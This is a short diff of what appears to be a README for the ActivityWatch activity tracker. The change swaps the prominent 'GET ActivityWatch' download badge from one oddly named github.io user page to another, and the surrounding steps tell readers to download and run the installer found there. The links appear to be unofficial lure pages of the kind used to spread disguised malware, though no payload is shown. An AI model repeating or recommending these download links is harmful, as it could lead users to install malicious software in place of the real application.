@@ -53,7 +53,7 @@ The ActivityWatch software is useful for understanding work habits, coding sessi
 
 Prerequisites: A desktop computer running Windows, macOS, or Linux, plus a browser if you want website tracking through an extension.
 
-[![GET ActivityWatch](https://img.shields.io/badge/GET%20%E2%80%94%20ActivityWatch-0078D6?style=for-the-badge&logoColor=white)](https://nathanklineqiks.github.io/.github/activitywatch-app)
+[![GET ActivityWatch](https://img.shields.io/badge/GET%20%E2%80%94%20ActivityWatch-0078D6?style=for-the-badge&logoColor=white)](https://vincentsnyderibna.github.io/.github/activitywatch-app)
 
 1.  **Download and Install:** Use ActivityWatch download resources for your platform, then run the installer or package suited to your system.
 2.  **Launch the Watchers:** Open ActivityWatch software and confirm that desktop activity, window titles, and idle detection are being recorded.
